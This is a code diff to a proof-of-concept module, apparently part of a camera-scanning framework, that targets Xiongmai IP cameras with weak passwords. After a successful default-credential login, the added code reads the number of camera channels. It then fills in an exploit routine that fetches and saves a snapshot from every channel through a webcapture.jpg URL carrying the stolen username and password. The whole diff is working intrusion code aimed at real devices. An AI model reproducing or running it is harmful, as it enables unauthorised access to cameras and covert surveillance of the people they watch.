@@ -1,3 +1,4 @@
+import re
 import requests
 from loguru import logger
 
@@ -28,14 +29,22 @@ class XioingmaiWeakPassword(POCTemplate):
                 try:
                     r = requests.get(url, headers=headers, data=data, verify=False, timeout=self.config.timeout)
                     if r.status_code == 200 and 'failed' not in r.text:
-                    # if r.status_code == 200 and len(r.text) > 5000:
-                        return ip, str(port), self.product, user, password, self.name
+                        ch_num = 0
+                        if channel := re.findall(r'g_channelNumber=(.*);', r.text):
+                            ch_num = int(channel[0])
+                        return ip, str(port), self.product, user, password, self.name, ch_num
                 except Exception as e:
                     logger.error(e)
         return None
 
     def exploit(self, results):
-        pass
+        ip, port, product, user, password, name, ch_num = results
+        res = []
+        for i in range(1, ch_num + 1):
+            url = f"http://{ip}:{port}/webcapture.jpg?command=snap&channel={i}&user={user}&password={password}"
+            name = f"{ip}-{port}-{user}-{password}-channel_{i}.jpg"
+            res.append(self._snapshot(url, name))
+        return sum(res)
 
 
 POCTemplate.register_poc(XioingmaiWeakPassword)
